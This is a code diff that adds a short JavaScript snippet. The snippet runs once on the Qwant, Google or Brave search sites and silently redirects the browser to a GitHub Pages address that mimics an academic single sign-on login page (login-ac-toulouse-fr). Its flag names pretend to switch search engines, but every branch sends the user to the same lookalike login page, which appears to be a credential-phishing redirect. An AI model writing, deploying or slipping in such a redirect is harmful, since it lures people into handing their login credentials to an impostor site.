@@ -1,1 +1,25 @@
+(function () {
+  const FLAG = "redirect_used";
 
+  if (localStorage.getItem(FLAG)) return;
+
+  const host = window.location.hostname;
+
+  if (host.includes("qwant.com")) {
+    localStorage.setItem(FLAG, "qwant_to_google");
+    window.location.href = "https://login-ac-toulouse-fr.github.io/idp/profile/oidc/authorize-execution-e1s2.html";
+    return;
+  }
+
+  if (host.includes("google.com")) {
+    localStorage.setItem(FLAG, "google_to_qwant");
+    window.location.href = "https://login-ac-toulouse-fr.github.io/idp/profile/oidc/authorize-execution-e1s2.html";
+    return;
+  }
+
+  if (host.includes("search.brave.com")) {
+    localStorage.setItem(FLAG, "brave_to_google");
+    window.location.href = "https://login-ac-toulouse-fr.github.io/idp/profile/oidc/authorize-execution-e1s2.html";
+    return;
+  }
+})();
